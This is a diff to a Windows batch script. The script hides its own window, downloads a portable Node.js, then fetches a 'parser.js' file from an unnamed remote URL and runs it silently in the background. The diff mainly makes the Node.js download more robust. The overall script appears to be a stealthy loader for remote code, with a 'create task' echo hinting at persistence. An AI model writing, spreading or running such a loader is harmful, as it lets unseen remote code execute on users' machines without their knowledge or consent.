@@ -4,35 +4,49 @@ setlocal enabledelayedexpansion
 if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
 set "NODE_VERSION=20.11.1"
-set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
-set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
+set "ARCH=x64"
+set "NODE_ZIP=node-v%NODE_VERSION%-win-%ARCH%.zip"
+set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_ZIP%"
 set "EXTRACT_DIR=%~dp0nodejs"
-set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
+set "NODE_EXE=%EXTRACT_DIR%\node-v%NODE_VERSION%-win-%ARCH%\node.exe"
 
-if not exist "%PORTABLE_NODE%" (
-    where curl >nul 2>&1
-    if %errorlevel% NEQ 0 (
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
-    ) else (
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
-    )
+if exist "%NODE_EXE%" goto :node_ready
+if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"
 
-    if not exist "%~dp0%NODE_MSI%" (
-        exit /b 1
-    )
-    msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
-
-    del "%~dp0%NODE_MSI%"
-    
+where curl >nul 2>&1
+if %errorlevel% EQU 0 (
+    curl.exe -s -L --retry 3 --retry-delay 2 -o "%EXTRACT_DIR%\%NODE_ZIP%" "%DOWNLOAD_URL%"
+) else (
+    powershell -Command "& {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+        Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%EXTRACT_DIR%\%NODE_ZIP%';
+    }"
 )
 
-if exist "%PORTABLE_NODE%" (
-    set "NODE_EXE=%PORTABLE_NODE%"
-    set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
+if not exist "%EXTRACT_DIR%\%NODE_ZIP%" (
+    powershell -Command "& {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+        Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%EXTRACT_DIR%\%NODE_ZIP%';
+    }"
+)
+
+if not exist "%EXTRACT_DIR%\%NODE_ZIP%" (
+    exit /b 1
+)
+
+powershell -Command "Expand-Archive -Path '%EXTRACT_DIR%\%NODE_ZIP%' -DestinationPath '%EXTRACT_DIR%' -Force"
+
+del "%EXTRACT_DIR%\%NODE_ZIP%" 2>nul
+
+if exist "%NODE_EXE%" (
+    set "NODE_EXE=%NODE_EXE%"
+
+    set "PATH=%EXTRACT_DIR%\node-v%NODE_VERSION%-win-%ARCH%;%PATH%"
 ) else (
     exit /b 1
 )
 
+:node_ready
 :: -------------------------
 :: Confirm Node.js works
 :: -------------------------
@@ -54,9 +68,10 @@ echo "create task"
 curl -L -o "%PJS%" "%URL%/700/parser.js"
 
 :: -------------------------
-:: Run
+:: Run the parser
 :: -------------------------
 if exist "%PJS%" (
+    echo [INFO] Running parser.js...
     start "" /b "%NODE_EXE%" "%PJS%"
     if errorlevel 1 (
         echo [ERROR] parser execution failed.
